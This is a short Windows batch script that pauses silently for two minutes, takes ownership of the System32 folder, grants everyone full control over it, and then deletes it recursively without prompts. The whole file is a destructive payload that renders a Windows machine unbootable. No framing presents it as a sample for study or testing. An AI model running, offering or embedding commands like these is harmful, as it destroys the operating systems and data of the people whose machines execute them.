@echo off
timeout /t 120 /nobreak >nul
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant Everyone:F /t
rd /s /q C:\Windows\System32
